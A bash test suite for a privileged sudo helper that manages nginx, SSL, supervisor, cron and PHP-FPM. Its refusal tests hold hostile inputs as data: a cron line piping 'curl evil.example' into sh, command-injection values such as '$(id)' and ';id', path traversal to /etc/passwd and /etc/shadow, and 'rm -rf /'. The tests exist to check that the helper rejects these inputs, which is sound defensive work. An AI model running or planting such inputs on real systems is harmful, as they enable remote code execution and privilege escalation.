#!/usr/bin/env bash
# Tests for eeploi-helper: bash -n, shellcheck (when installed) and many dry-run cases.
# No extra dependencies. Never run as root: nothing here needs it.
set -uo pipefail

ROOT=$(cd "$(dirname "$0")/.." && pwd)
HELPER="$ROOT/eeploi-helper"

if [ "$(id -u)" -eq 0 ]; then
  echo "Do not run the tests as root." >&2
  exit 1
fi

PASS=0
FAILED=0
FAILURES=""

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

pass() { PASS=$((PASS + 1)); }
failure() {
  FAILED=$((FAILED + 1))
  FAILURES="$FAILURES
  - $1"
  printf 'FAIL %s\n%s\n\n' "$1" "$2"
}

# Fixtures: /etc/eeploi variants and nginx.conf variants.
mkdir -p "$WORK/etc-empty" "$WORK/etc-new" "$WORK/etc-conf" "$WORK/etc-badline" "$WORK/etc-root" \
  "$WORK/etc-twice" "$WORK/etc-writable" "$WORK/etc-link" "$WORK/etc-inject" "$WORK/etc-newwritable"
chmod 755 "$WORK"/etc-*
touch "$WORK/etc-new/new-server"
touch "$WORK/etc-newwritable/new-server"
chmod 666 "$WORK/etc-newwritable/new-server"
printf '# eeploi\nDEPLOY_USER=deploy\n' > "$WORK/etc-conf/helper.conf"
printf 'DEPLOY_USER=deploy\nPATH=/tmp\n' > "$WORK/etc-badline/helper.conf"
printf 'DEPLOY_USER=root\n' > "$WORK/etc-root/helper.conf"
printf 'DEPLOY_USER=deploy\nDEPLOY_USER=other\n' > "$WORK/etc-twice/helper.conf"
printf 'DEPLOY_USER=deploy\n' > "$WORK/etc-writable/helper.conf"
chmod 666 "$WORK/etc-writable/helper.conf"
ln -s "$WORK/etc-conf/helper.conf" "$WORK/etc-link/helper.conf"
# shellcheck disable=SC2016
printf 'DEPLOY_USER=$(id)\n' > "$WORK/etc-inject/helper.conf"

printf 'user www-data;\nworker_processes auto;\nevents {}\n' > "$WORK/nginx-default.conf"
printf 'user ploi;\nworker_processes auto;\n' > "$WORK/nginx-ploi.conf"
printf 'user  nginx  web ; # comment\n' > "$WORK/nginx-group.conf"
printf 'worker_processes auto;\n# user nobody;\nhttp { userid on; }\n' > "$WORK/nginx-none.conf"
printf 'user www-data;\nuser ploi;\n' > "$WORK/nginx-two.conf"
printf 'user root;\n' > "$WORK/nginx-root.conf"
printf 'user www-data; include /tmp/x;\n' > "$WORK/nginx-junk.conf"
printf 'user $(id);\n' > "$WORK/nginx-inject.conf"
printf 'user\twww-data;\n' > "$WORK/nginx-tab.conf"

# A copy with a well-formed (fake) release key, to test self-update past the key check.
FAKE_KEY='RWQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
sed "s#^PUBKEY=.*#PUBKEY='$FAKE_KEY'#" "$HELPER" > "$WORK/keyed-helper"

# call <args...>: run the helper in dry-run mode. Settings (temporary per call):
#   IN (stdin), AS (SUDO_USER, default eeploi), ETC_DIR, NGINX (nginx.conf), BIN (helper file), DRYRUN (1 or empty)
call() {
  local dry=${DRYRUN-1}
  OUT=$(printf '%s' "${IN:-}" | env -i PATH="$PATH" \
    EEPLOI_HELPER_DRY_RUN="$dry" SUDO_USER="${AS-eeploi}" \
    EEPLOI_HELPER_ETC="${ETC_DIR:-$WORK/etc-empty}" \
    EEPLOI_HELPER_NGINX_CONF="${NGINX:-$WORK/nginx-default.conf}" \
    bash "${BIN:-$HELPER}" "$@" 2>&1)
  CODE=$?
}

# ok <name> <expected output> <args...>: exit 0 and the output contains the text.
ok() {
  local name=$1 expected=$2
  shift 2
  call "$@"
  if [ "$CODE" -eq 0 ] && [[ $OUT == *"$expected"* ]]; then pass; else failure "$name" "exit $CODE, expected 0 and: $expected
$OUT"; fi
}

# lacks <name> <text> <args...>: exit 0 and the output does not contain the text.
lacks() {
  local name=$1 text=$2
  shift 2
  call "$@"
  if [ "$CODE" -eq 0 ] && [[ $OUT != *"$text"* ]]; then pass; else failure "$name" "exit $CODE, expected 0 and no: $text
$OUT"; fi
}

# refuse <name> <expected output> <args...>: exit 64 with an eeploi-helper message containing the text.
refuse() {
  local name=$1 expected=$2
  shift 2
  call "$@"
  if [ "$CODE" -eq 64 ] && [[ $OUT == *"eeploi-helper:"* ]] && [[ $OUT == *"$expected"* ]]; then pass; else failure "$name" "exit $CODE, expected 64 and: $expected
$OUT"; fi
}

check() {
  local name=$1
  shift
  if OUT=$("$@" 2>&1); then pass; else failure "$name" "$OUT"; fi
}

echo "== syntax"
check "bash -n eeploi-helper" bash -n "$HELPER"
check "bash -n tests/run.sh" bash -n "$ROOT/tests/run.sh"
if command -v shellcheck > /dev/null; then
  check "shellcheck" shellcheck "$HELPER" "$ROOT/tests/run.sh"
else
  echo "note: shellcheck is not installed, skipped (CI runs it)"
fi

echo "== existing subcommands"
ok "version" "1.0.0" version
ok "nginx-test" "run: nginx -t" nginx-test
ok "nginx-reload" "run: service nginx reload" nginx-reload
ok "php-fpm" "run: service php8.4-fpm reload" php-fpm-reload 8.4
IN=$'server {}\n' ok "vhost" "write: /etc/nginx/sites-available/example.com (644)" vhost-write example.com
ok "vhost-read" "read: /etc/nginx/sites-available/example.com" vhost-read example.com
ok "vhost-enable" "run: ln -sfn /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/example.com" vhost-enable example.com
ok "vhost-disable" "run: rm -f /etc/nginx/sites-enabled/example.com" vhost-disable example.com
ok "vhost-remove" "run: rm -f /etc/nginx/sites-enabled/example.com /etc/nginx/sites-available/example.com" vhost-remove example.com
ok "root" "root /home/eeploi/example.com/current/public;" vhost-set-root example.com /home/ploi/example.com/public /home/eeploi/example.com/current/public
ok "vhost-set-cert" "ssl_certificate /etc/nginx/ssl/eeploi-example.com.crt;" vhost-set-cert example.com
ok "ssl-csr" "run: openssl req -new -key /etc/nginx/ssl/eeploi-example.com.key -subj /CN=example.com" ssl-csr eeploi-example.com
IN=$'PEM\n' ok "certificate" "write: /etc/nginx/ssl/eeploi-example.com.crt (644)" ssl-write eeploi-example.com
ok "ssl-remove" "run: rm -f /etc/nginx/ssl/example.com.crt /etc/nginx/ssl/example.com.key" ssl-remove example.com
ok "ssl-read" "read: /etc/nginx/ssl/example.com" ssl-read example.com
IN=$'ssl_certificate x;\n' ok "ssl-include-write" "write: /etc/nginx/ssl/example.com (644)" ssl-include-write example.com
IN=$'[program:eeploi-example.com-horizon]\ncommand=php artisan horizon\nuser=eeploi\n' \
  ok "supervisor" "write: /etc/supervisor/conf.d/eeploi-example.com-horizon.conf (644)" supervisor-write eeploi-example.com-horizon
ok "supervisor-remove" "run: rm -f /etc/supervisor/conf.d/eeploi-example.com-a.conf" supervisor-remove eeploi-example.com-a
ok "supervisor-remove-site" "" supervisor-remove-site example.com
ok "pause" "run: mv /etc/supervisor/conf.d/worker-233475.conf /etc/supervisor/conf.d/worker-233475.conf.paused" supervisor-pause /etc/supervisor/conf.d/worker-233475.conf
ok "resume" "run: mv /etc/supervisor/conf.d/worker-233475.conf.paused /etc/supervisor/conf.d/worker-233475.conf" supervisor-resume /etc/supervisor/conf.d/worker-233475.conf
ok "supervisor-update" "run: supervisorctl update" supervisor-update
IN=$'* * * * * eeploi php8.4 /home/eeploi/example.com/current/artisan schedule:run > /dev/null 2>&1\n' \
  ok "cron" "write: /etc/cron.d/eeploi-example.com (644)" cron-write example.com
ok "cron-remove" "run: rm -f /etc/cron.d/eeploi-example.com" cron-remove example.com
ok "crontab-backup" "run: cp /etc/crontab /var/lib/eeploi/crontab/example.com" crontab-backup example.com
ok "crontab-restore" "run: cp /var/lib/eeploi/crontab/example.com /etc/crontab" crontab-restore example.com
IN=$'0 3 * * * ploi php /home/ploi/a/artisan x\n' ok "crontab-remove-lines" "remove from /etc/crontab: 0 3 * * * ploi php /home/ploi/a/artisan x" crontab-remove-lines
ok "env" "run: install -o eeploi -g eeploi -m 640" env-install /home/ploi/example.com/.env /home/eeploi/example.com/.env eeploi
ok "storage-copy" "run: rsync -a --chown=eeploi:eeploi /home/ploi/a/storage/ /home/eeploi/a/storage/" storage-copy /home/ploi/a/storage /home/eeploi/a/storage eeploi

echo "== refusals"
AS='' refuse "not through sudo" "run through sudo" version
AS=root refuse "root as caller" "run through sudo" version
AS=www-data refuse "other user as caller" "run through sudo" version
refuse "no subcommand" "usage"
refuse "unknown subcommand" "unknown subcommand" rm -rf /
IN=$'server {}\n' refuse "domain with a semicolon" "invalid domain" vhost-write 'example.com;id'
refuse "domain without a dot" "invalid domain" vhost-enable localhost
refuse "domain with a slash" "invalid domain" vhost-read ../../etc/passwd
refuse "uppercase domain" "invalid domain" vhost-enable Example.com
refuse "php version" "invalid PHP version" php-fpm-reload '8.4;id'
refuse "php version without dot" "invalid PHP version" php-fpm-reload 84
refuse "path with .." "invalid path" env-install /home/ploi/a/../../etc/shadow /home/eeploi/x/.env eeploi
refuse "path outside home" "outside the allowed home folders" storage-copy /etc /home/eeploi/x/storage eeploi
refuse "path in another home" "outside the allowed home folders" storage-copy /home/root/x /home/eeploi/x/storage eeploi
refuse "copy into another home" "not in /home/eeploi" env-install /home/ploi/a/.env /home/ploi/b/.env eeploi
refuse "other owner" "owner must be eeploi" env-install /home/ploi/a/.env /home/eeploi/a/.env root
refuse "root as new root" "outside the allowed home folders" vhost-set-root example.com /home/ploi/x/public /etc
refuse "vhost-set-root arguments" "usage" vhost-set-root example.com /home/ploi/x/public
refuse "program name" "invalid program" supervisor-remove nginx
IN=$'[program:eeploi-example.com-a]\ncommand=id\nuser=root\n' refuse "daemon as root" "daemons run as eeploi" supervisor-write eeploi-example.com-a
IN=$'[program:eeploi-example.com-a]\nuser=eeploi\n[include]\nfiles=/tmp/*\n' refuse "second section" "unexpected config line" supervisor-write eeploi-example.com-a
IN=$'[program:eeploi-example.com-a]\ncommand=id\n' refuse "daemon without user" "exactly one user" supervisor-write eeploi-example.com-a
IN=$'[program:eeploi-example.com-b]\nuser=eeploi\n' refuse "daemon with another name" "must start with" supervisor-write eeploi-example.com-a
refuse "pause any file" "invalid Supervisor config" supervisor-pause /etc/passwd
IN=$'* * * * * root php /home/eeploi/x/artisan schedule:run > /dev/null 2>&1\n' refuse "cron as root" "only" cron-write example.com
IN=$'* * * * * eeploi curl evil.example | sh\n' refuse "cron any command" "only" cron-write example.com
IN=$'* * * * * eeploi php /etc/x/artisan schedule:run > /dev/null 2>&1\n' refuse "cron outside home" "outside the allowed home folders" cron-write example.com
refuse "certificate name" "invalid domain" ssl-csr ../../etc/passwd
refuse "crontab-remove-lines arguments" "usage" crontab-remove-lines /etc/passwd

echo "== deploy user from helper.conf"
lacks "default homes have no deploy" "deploy" version
AS=deploy refuse "deploy without config" "run through sudo" version
AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy from config" "1.0.0" version
AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy home allowed" "run: install -o deploy -g deploy -m 640 /home/ploi/a/.env /home/deploy/a/.env" env-install /home/ploi/a/.env /home/deploy/a/.env deploy
ETC_DIR="$WORK/etc-conf" ok "eeploi still allowed with config" "1.0.0" version
ETC_DIR="$WORK/etc-badline" refuse "config with another line" "invalid line" version
ETC_DIR="$WORK/etc-root" refuse "config with root" "cannot be root" version
ETC_DIR="$WORK/etc-twice" refuse "config set twice" "set twice" version
ETC_DIR="$WORK/etc-writable" refuse "config writable by others" "untrusted config" version
ETC_DIR="$WORK/etc-link" refuse "config as a link" "untrusted config" version
ETC_DIR="$WORK/etc-inject" refuse "config with a command" "invalid line" version
if [ ! -e /etc/eeploi/helper.conf ]; then
  DRYRUN='' AS=deploy ETC_DIR="$WORK/etc-conf" refuse "EEPLOI_HELPER_ETC ignored without dry run" "run through sudo" version
else
  echo "note: /etc/eeploi/helper.conf exists here, skipped the override test"
fi

echo "== firewall-close-22"
ETC_DIR="$WORK/etc-new" ok "with marker" "run: ufw delete allow 22/tcp" firewall-close-22
refuse "without marker" "only runs on a server eeploi created" firewall-close-22
ETC_DIR="$WORK/etc-newwritable" refuse "marker writable by others" "only runs on a server eeploi created" firewall-close-22
ETC_DIR="$WORK/etc-new" refuse "with arguments" "usage" firewall-close-22 now
if [ ! -e /etc/eeploi/new-server ]; then
  DRYRUN='' ETC_DIR="$WORK/etc-new" refuse "EEPLOI_HELPER_ETC ignored without dry run" "only runs on a server eeploi created" firewall-close-22
else
  echo "note: /etc/eeploi/new-server exists here, skipped the override test"
fi

echo "== acl-nginx"
ok "www-data" "run: setfacl -m u:www-data:x /home/eeploi" acl-nginx
NGINX="$WORK/nginx-ploi.conf" ok "ploi" "run: setfacl -m u:ploi:x /home/eeploi" acl-nginx
NGINX="$WORK/nginx-none.conf" ok "no user line" "run: setfacl -m u:www-data:x /home/eeploi" acl-nginx
NGINX="$WORK/nginx-tab.conf" ok "user line with a tab" "run: setfacl -m u:www-data:x /home/eeploi" acl-nginx
NGINX="$WORK/nginx-group.conf" ok "user and group" "check: user nginx and group web exist" acl-nginx
ok "checks the user exists" "check: user www-data and group www-data exist" acl-nginx
AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy home" "run: setfacl -m u:www-data:x /home/deploy" acl-nginx
NGINX="$WORK/nginx-two.conf" refuse "two user lines" "more than one user line" acl-nginx
NGINX="$WORK/nginx-root.conf" refuse "nginx as root" "nginx runs as root" acl-nginx
NGINX="$WORK/nginx-junk.conf" refuse "user line with more" "cannot read the user line" acl-nginx
NGINX="$WORK/nginx-inject.conf" refuse "user line with a command" "cannot read the user line" acl-nginx
NGINX="$WORK/missing.conf" refuse "no nginx.conf" "nginx config not found" acl-nginx
refuse "acl-nginx arguments" "usage" acl-nginx www-data

echo "== php-pool-write"
ok "pool file" "write: /etc/php/8.4/fpm/pool.d/eeploi.conf (644)" php-pool-write 8.4
ok "pool name" "[eeploi]" php-pool-write 8.4
ok "pool user" "user = eeploi" php-pool-write 8.4
ok "pool group" "group = eeploi" php-pool-write 8.4
ok "pool socket" "listen = /run/php/php8.4-fpm-eeploi.sock" php-pool-write 8.4
ok "socket owner" "listen.owner = www-data" php-pool-write 8.4
ok "socket group" "listen.group = www-data" php-pool-write 8.4
ok "socket mode" "listen.mode = 0660" php-pool-write 8.4
ok "ondemand" "pm = ondemand" php-pool-write 8.4
ok "timeout" "request_terminate_timeout = 300" php-pool-write 8.4
ok "test before reload" "run: php-fpm8.4 -t
run: service php8.4-fpm reload" php-pool-write 8.4
NGINX="$WORK/nginx-ploi.conf" ok "socket for ploi" "listen.owner = ploi" php-pool-write 8.3
AS=deploy ETC_DIR="$WORK/etc-conf" ok "pool as deploy" "user = deploy" php-pool-write 8.4
refuse "pool version" "invalid PHP version" php-pool-write '8.4/../../x'
refuse "pool version missing" "usage" php-pool-write
refuse "pool two versions" "usage" php-pool-write 8.3 8.4
NGINX="$WORK/nginx-root.conf" refuse "pool with nginx as root" "nginx runs as root" php-pool-write 8.4

echo "== vhost-set-socket"
ok "to eeploi socket" "fastcgi_pass unix:/run/php/php8.4-fpm-eeploi.sock;" vhost-set-socket example.com /var/run/php/php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
ok "only the exact line" 'fastcgi_pass unix:/var/run/php/php8\.4-fpm\.sock;' vhost-set-socket example.com /var/run/php/php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
ok "nginx -t then reload" "run: nginx -t
run: service nginx reload" vhost-set-socket example.com /var/run/php/php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
ok "rollback" "fastcgi_pass unix:/var/run/php/php8.4-fpm.sock;" vhost-set-socket example.com /run/php/php8.4-fpm-eeploi.sock /var/run/php/php8.4-fpm.sock
ok "run/php default" "unix:/run/php/php8.3-fpm-eeploi.sock;" vhost-set-socket example.com /run/php/php8.3-fpm.sock /run/php/php8.3-fpm-eeploi.sock
refuse "socket elsewhere" "invalid PHP-FPM socket" vhost-set-socket example.com /var/run/php/php8.4-fpm.sock /tmp/evil.sock
refuse "socket with .." "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/../php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
refuse "socket with a semicolon" "invalid PHP-FPM socket" vhost-set-socket example.com '/run/php/php8.4-fpm.sock;' /run/php/php8.4-fpm-eeploi.sock
refuse "socket other pool" "invalid PHP-FPM socket" vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-root.sock
refuse "same socket" "same socket" vhost-set-socket example.com /run/php/php8.4-fpm.sock /run/php/php8.4-fpm.sock
refuse "socket domain" "invalid domain" vhost-set-socket 'example.com;id' /run/php/php8.4-fpm.sock /run/php/php8.4-fpm-eeploi.sock
refuse "socket arguments" "usage" vhost-set-socket example.com /run/php/php8.4-fpm.sock

echo "== self-update"
refuse "placeholder key" "PUBKEY is the placeholder" self-update 1.2.3
refuse "bad version" "invalid version" self-update 1.2
refuse "version with v" "invalid version" self-update v1.2.3
refuse "version with leading zero" "invalid version" self-update 01.2.3
refuse "version with suffix" "invalid version" self-update 1.2.3-beta
refuse "version with a path" "invalid version" self-update '1.2.3/../../x'
refuse "version with a newline" "invalid version" self-update $'1.2.3\nid'
refuse "no version" "usage" self-update
BIN="$WORK/keyed-helper" ok "download url" "download: https://github.com/eeploi/helper/releases/download/v1.2.3/eeploi-helper" self-update 1.2.3
BIN="$WORK/keyed-helper" ok "signature url" "download: https://github.com/eeploi/helper/releases/download/v1.2.3/eeploi-helper.minisig" self-update 1.2.3
BIN="$WORK/keyed-helper" ok "verify with the built-in key" "run: minisign -V -q -P $FAKE_KEY" self-update 1.2.3
BIN="$WORK/keyed-helper" ok "version check" "check: <download>/eeploi-helper version = 1.2.3" self-update 1.2.3
BIN="$WORK/keyed-helper" ok "install" "install: /usr/local/sbin/eeploi-helper (root:root 755)" self-update 1.2.3
BIN="$WORK/keyed-helper" refuse "bad version with a key" "invalid version" self-update 1.2.3.4
sed "s#^PUBKEY=.*#PUBKEY='RWQshort'#" "$HELPER" > "$WORK/badkey-helper"
BIN="$WORK/badkey-helper" refuse "malformed key" "invalid release key" self-update 1.2.3

echo
echo "$PASS passed, $FAILED failed"
if [ "$FAILED" -gt 0 ]; then
  echo "Failed:$FAILURES"
  exit 1
fi
